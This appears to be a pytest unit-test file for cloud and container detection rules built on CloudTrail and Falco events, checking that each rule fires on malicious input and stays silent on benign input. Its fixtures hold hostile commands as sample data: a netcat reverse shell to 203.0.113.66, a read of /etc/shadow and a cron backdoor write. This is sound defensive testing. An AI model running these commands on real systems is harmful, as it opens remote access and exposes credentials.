"""
Unit tests for detection rules.

The core property of a detection: it fires on malicious input and stays SILENT
on benign input. Every rule gets at least one of each.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

from src.detections import (
    BRUTE_FORCE_THRESHOLD,
    detect_access_key_creation,
    detect_brute_force,
    detect_iam_privilege_escalation,
    detect_package_mgmt_in_container,
    detect_root_usage,
    detect_sensitive_file_read,
    detect_shell_in_container,
    detect_suspicious_outbound,
    detect_write_below_etc,
    run_detections,
)
from src.schema import NormalizedEvent

T0 = datetime(2026, 10, 20, 12, 0, 0, tzinfo=timezone.utc)


def cloudtrail(action, *, actor="alice", actor_type="IAMUser", outcome=None,
               ip="203.0.113.10", at=T0, raw=None):
    return NormalizedEvent(
        source="cloudtrail", timestamp=at, action=action, actor=actor,
        actor_type=actor_type, source_ip=ip, region="us-east-1",
        outcome=outcome, raw=raw or {},
    )


def falco(rule, *, actor="root", container="web-frontend", process="",
          at=T0, output_fields=None):
    fields = {"user.name": actor, "container.name": container,
              "k8s.ns.name": "production", "k8s.pod.name": "web-frontend-abc",
              "proc.cmdline": process}
    fields.update(output_fields or {})
    return NormalizedEvent(
        source="falco", timestamp=at, action=rule, actor=actor,
        actor_type="container_user", container=container, namespace="production",
        pod="web-frontend-abc", process=process,
        raw={"rule": rule, "output_fields": fields},
    )


# --- brute force -----------------------------------------------------------

def test_brute_force_fires_on_repeated_failures():
    events = [
        cloudtrail("ConsoleLogin", actor="bob", outcome="failure",
                   at=T0 + timedelta(seconds=10 * i))
        for i in range(BRUTE_FORCE_THRESHOLD)
    ]
    findings = detect_brute_force(events)
    assert len(findings) == 1
    assert findings[0].attack_technique == "T1110"


def test_brute_force_silent_on_few_failures():
    events = [
        cloudtrail("ConsoleLogin", actor="bob", outcome="failure",
                   at=T0 + timedelta(seconds=10 * i))
        for i in range(BRUTE_FORCE_THRESHOLD - 1)
    ]
    assert detect_brute_force(events) == []


def test_brute_force_silent_on_successful_logins():
    events = [
        cloudtrail("ConsoleLogin", actor="bob", outcome="success",
                   at=T0 + timedelta(seconds=10 * i))
        for i in range(BRUTE_FORCE_THRESHOLD + 2)
    ]
    assert detect_brute_force(events) == []


# --- root usage ------------------------------------------------------------

def test_root_login_fires():
    e = cloudtrail("ConsoleLogin", actor="unknown", actor_type="Root",
                   outcome="success")
    findings = detect_root_usage([e])
    assert len(findings) == 1
    assert findings[0].attack_technique == "T1078.004"


def test_root_usage_silent_on_iam_user():
    e = cloudtrail("ConsoleLogin", actor="alice", actor_type="IAMUser",
                   outcome="success")
    assert detect_root_usage([e]) == []


# --- IAM policy change -----------------------------------------------------

def test_iam_policy_change_fires():
    e = cloudtrail("AttachUserPolicy", actor_type="Root",
                   raw={"requestParameters": {"userName": "attacker",
                                              "policyName": "AdminAccess"}})
    findings = detect_iam_privilege_escalation([e])
    assert len(findings) == 1
    assert findings[0].severity == "critical"


def test_iam_policy_change_silent_on_describe():
    e = cloudtrail("DescribeInstances")
    assert detect_iam_privilege_escalation([e]) == []


# --- access key creation ---------------------------------------------------

def test_access_key_creation_fires_and_escalates_for_root():
    root_e = cloudtrail("CreateAccessKey", actor_type="Root",
                        raw={"requestParameters": {"userName": "attacker"}})
    user_e = cloudtrail("CreateAccessKey", actor_type="IAMUser",
                        raw={"requestParameters": {"userName": "svc"}})
    assert detect_access_key_creation([root_e])[0].severity == "critical"
    assert detect_access_key_creation([user_e])[0].severity == "medium"


# --- falco: shell in container ---------------------------------------------

def test_shell_in_container_fires():
    e = falco("Terminal shell in container", process="bash")
    findings = detect_shell_in_container([e])
    assert len(findings) == 1
    assert findings[0].attack_technique == "T1059"


def test_shell_rule_silent_on_cloudtrail():
    # cloud-audit events have no container; runtime rules must not fire on them
    e = cloudtrail("ConsoleLogin", outcome="success")
    assert detect_shell_in_container([e]) == []


# --- falco: sensitive file read --------------------------------------------

def test_sensitive_file_read_fires_on_shadow():
    e = falco("Read sensitive file untrusted", process="cat /etc/shadow",
              output_fields={"fd.name": "/etc/shadow"})
    findings = detect_sensitive_file_read([e])
    assert len(findings) == 1
    assert findings[0].attack_technique == "T1552.001"


def test_sensitive_file_read_silent_on_ordinary_file():
    e = falco("Read sensitive file untrusted", process="cat /tmp/data",
              output_fields={"fd.name": "/tmp/data"})
    assert detect_sensitive_file_read([e]) == []


# --- falco: package mgmt ---------------------------------------------------

def test_package_mgmt_fires():
    e = falco("Launch Package Management Process in Container",
              process="apt-get install netcat",
              output_fields={"proc.name": "apt-get"})
    assert len(detect_package_mgmt_in_container([e])) == 1


# --- falco: write below etc (the false-positive we fixed) ------------------

def test_write_below_etc_fires_on_write():
    e = falco("Write below etc", process="touch /etc/cron.d/backdoor",
              output_fields={"fd.name": "/etc/cron.d/backdoor"})
    findings = detect_write_below_etc([e])
    assert len(findings) == 1
    assert findings[0].severity == "critical"  # cron => critical


def test_write_below_etc_silent_on_read_of_etc_file():
    # regression test: a READ of /etc/shadow must NOT fire the WRITE rule
    e = falco("Read sensitive file untrusted", process="cat /etc/shadow",
              output_fields={"fd.name": "/etc/shadow"})
    assert detect_write_below_etc([e]) == []


# --- falco: suspicious outbound / reverse shell ----------------------------

def test_reverse_shell_fires_critical():
    e = falco("Unexpected outbound connection",
              process="nc 203.0.113.66 4444 -e /bin/bash",
              output_fields={"fd.sip": "203.0.113.66"})
    findings = detect_suspicious_outbound([e])
    assert len(findings) == 1
    assert findings[0].severity == "critical"


# --- full engine over a mixed stream ---------------------------------------

def test_run_detections_over_mixed_sources():
    events = [
        cloudtrail("ConsoleLogin", actor_type="Root", outcome="success"),
        falco("Terminal shell in container", process="bash"),
    ]
    findings = run_detections(events)
    rule_ids = {f.rule_id for f in findings}
    assert "ROOT_CONSOLE_LOGIN" in rule_ids
    assert "K8S_SHELL_IN_CONTAINER" in rule_ids
